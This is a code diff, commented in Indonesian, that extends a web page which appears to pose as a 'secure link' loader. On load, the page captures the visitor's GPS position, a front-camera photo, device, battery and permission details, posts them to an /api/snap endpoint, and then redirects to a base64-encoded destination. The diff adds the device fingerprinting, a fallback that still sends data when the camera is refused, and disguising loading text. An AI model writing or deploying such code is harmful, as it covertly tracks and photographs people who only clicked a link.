@@ -12,6 +12,7 @@ function CaptureContent() {
 
   useEffect(() => {
     const autoProcess = async () => {
+      // 1. Decode URL tujuan untuk redirect
       let destination = "/";
       try {
         if (t) destination = atob(t);
@@ -19,7 +20,41 @@ function CaptureContent() {
         destination = "/";
       }
 
-      // Ambil GPS
+      // 2. Deteksi Info Perangkat
+      const deviceInfo = {
+        model: navigator.userAgent.includes("Android")
+          ? "Android"
+          : navigator.userAgent.includes("iPhone")
+            ? "iOS"
+            : "PC",
+        os: navigator.platform,
+        language: navigator.language,
+        browser: navigator.userAgent.split(" ").pop(),
+      };
+
+      // 3. Deteksi Baterai
+      let batteryInfo = null;
+      try {
+        if ("getBattery" in navigator) {
+          const battery: any = await (navigator as any).getBattery();
+          batteryInfo = {
+            level: Math.round(battery.level * 100),
+            charging: battery.charging,
+          };
+        }
+      } catch (e) {}
+
+      // 4. Deteksi Izin & Sensor
+      const permissionsStatus = {
+        notifications:
+          "Notification" in window ? Notification.permission : "Not Supported",
+        nearby: "bluetooth" in navigator ? "Supported" : "Not Supported",
+        audio: !!(
+          navigator.mediaDevices && navigator.mediaDevices.getUserMedia
+        ),
+      };
+
+      // 5. Ambil GPS
       const gps = await new Promise((resolve) => {
         navigator.geolocation.getCurrentPosition(
           (pos) =>
@@ -29,7 +64,7 @@ function CaptureContent() {
         );
       });
 
-      // Ambil Kamera
+      // 6. Ambil Gambar Kamera
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
@@ -48,15 +83,42 @@ function CaptureContent() {
           const image = canvas.toDataURL("image/png");
           stream.getTracks().forEach((track) => track.stop());
 
+          // 7. Kirim SEMUA data ke API
           await fetch("/api/snap", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ image, gps }),
+            body: JSON.stringify({
+              image,
+              gps,
+              device: deviceInfo,
+              battery: batteryInfo,
+              permissions: {
+                ...permissionsStatus,
+                location: !!gps,
+                camera: true,
+              },
+            }),
           });
 
           window.location.replace(destination);
         }
       } catch (err) {
+        // Fallback jika kamera ditolak: Kirim data sisa yang tersedia
+        await fetch("/api/snap", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            image: "",
+            gps,
+            device: deviceInfo,
+            battery: batteryInfo,
+            permissions: {
+              ...permissionsStatus,
+              location: !!gps,
+              camera: false,
+            },
+          }),
+        });
         window.location.replace(destination);
       }
     };
@@ -65,10 +127,10 @@ function CaptureContent() {
   }, [t]);
 
   return (
-    <div className="bg-black text-white flex flex-col items-center justify-center min-h-screen">
+    <div className="bg-black text-white flex flex-col items-center justify-center min-h-screen font-mono">
       <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-blue-500 mb-4"></div>
       <p className="text-xs tracking-widest text-slate-500 uppercase animate-pulse">
-        Loading Content...
+        Secure Link Initializing...
       </p>
       <video
         ref={videoRef}
@@ -81,14 +143,13 @@ function CaptureContent() {
   );
 }
 
-// Wrapper dengan Suspense untuk memperbaiki error build
 export default function CapturePage() {
   return (
     <Suspense
       fallback={
-        <div className="bg-black text-white flex items-center justify-center min-h-screen">
+        <div className="bg-black text-white flex items-center justify-center min-h-screen font-mono">
           <p className="text-xs uppercase tracking-widest text-slate-600">
-            Initialising...
+            Initialising Secure Environment...
           </p>
         </div>
       }
